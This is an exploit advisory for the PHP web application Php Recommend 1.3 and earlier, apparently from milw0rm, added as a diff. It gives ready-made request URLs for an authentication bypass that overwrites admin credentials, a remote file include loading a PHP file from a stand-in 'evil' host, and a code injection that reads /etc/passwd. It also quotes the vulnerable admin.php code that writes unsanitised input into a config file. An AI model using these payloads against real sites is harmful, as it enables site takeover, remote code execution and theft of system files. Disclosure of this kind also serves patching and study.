@@ -1,0 +1,70 @@
+Php Recommend <=1.3 Authentication Bypass/Remote File Include/Code Injection Exploits
+
+
+Author: scriptjunkie  scriptjunkie.1 {nospam} googlemail {nospam} com
+Condition: RFI:  allow_url_fopen = On
+code injection: magic_quotes_gpc = Off
+
+Exploits:
+Authentication Bypass:
+change admin username and password:
+vulnerable.com/admin.php?submit=submit&form_admin_user=USERNAME&form_admin_pass=PASSWORD
+
+RFI:
+vulnerable.com/admin.php?submit=submit&form_include_template=http://evil/evil.php
+
+Code Injection:
+vulnerable.com/admin.php?submit=submit&form_aula=';readfile('/etc/passwd');'
+
+
+Vulnerable code in "admin.php":
+
+if($submit){
+$a = "'";
+$b = "<";
+$c = ">";
+$d = "";
+$content = "".$b."?php
+// Php Recommmend
+// Created By Frax.dk
+// GNU Licens
+// Please do not delete this text
+$".$d."page = '".$form_page."';
+$".$d."include_template = '".$form_include_template."';
+$".$d."cap = '".$form_cap."';
+$".$d."title = '".$form_title."';
+$".$d."aula = '".$form_aula."';
+$".$d."language = '".$form_language."';
+$".$d."admin_user = '".$form_admin_user."';
+$".$d."admin_pass = '".$form_admin_pass."';
+
+// -- Maincore -- //
+
+include $".$d."include_template;
+?".$c."";
+
+$file_name = "phpre_config.php";
+$file = $file_name;
+$create_file = fopen($file, "w+");
+
+if(!$create_file){die("<td><span style='color:red;'><? echo $error1; ?></span></td>\n");}
+
+//attempt to write basic content to the file
+if (fwrite($create_file, $content) === FALSE) {
+echo "<td><span style='color:red;'><? echo $error2; ?></span></td>\n";
+}else{echo "Succes";}
+fclose($create_file);
+
+
+which is reached since the authentication in server.php:
+if($user == $admin_user && $admin_pass == $pass){
+$error = "false";
+}else{
+setcookie("phpre_user", "", time()-3600);
+setcookie("phpre_pass", "", time()-3600);
+$error = "true";
+}
+
+is not checked sufficiently.
+
+# milw0rm.com [2009-05-11]
